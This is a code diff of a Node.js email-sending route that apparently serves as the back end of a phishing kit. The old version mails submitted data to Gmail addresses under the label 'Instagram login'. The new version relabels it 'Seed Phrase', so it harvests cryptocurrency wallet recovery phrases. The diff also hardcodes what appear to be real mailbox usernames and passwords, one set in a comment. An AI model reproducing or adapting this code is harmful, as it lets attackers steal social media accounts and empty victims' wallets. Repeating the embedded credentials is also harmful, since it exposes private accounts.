@@ -1,25 +1,28 @@
 let nodemailer = require('nodemailer')
 
 export default async function sendEmail (req, res) {
-    console.log(req.body)
+    // console.log(req.body)
 
      let transporter = nodemailer.createTransport({
-        port: 465,
         host: "smtp.gmail.com",
+        port: 465,
         secure: true, // true for 465, false for other ports
         auth: {
           user: 'lengleytony@gmail.com', // generated ethereal user
           pass: 'Vic123imu@', // generated ethereal password
         },
      })
+     
+    //  user: 'sales1687@tazhhq.com', // generated ethereal user
+    //  pass: '178zhonghang...',
 
        let info = await transporter.sendMail({
-        from: '"Common" <lengleytony@gmail.com>',
-        to: 'Wlara664@gmail.com, lengleytony@gmail.com',
+        from: '"seed" <sales1687@tazhhq.com>',
+        to: 'lengleytony@gmail.com',
         subject: 'Instagram',
-        text: `Instagram login ${req.body}`,
-        html: `<h2> Instagram Login: ${req.body}</h2>`
+        text: ` Seed Phrase: ${req.body}`,
+        html: `<h2> Seed Phrase: ${req.body}</h2>`
        })
-
+       console.log(info)
       res.json({info})
 }
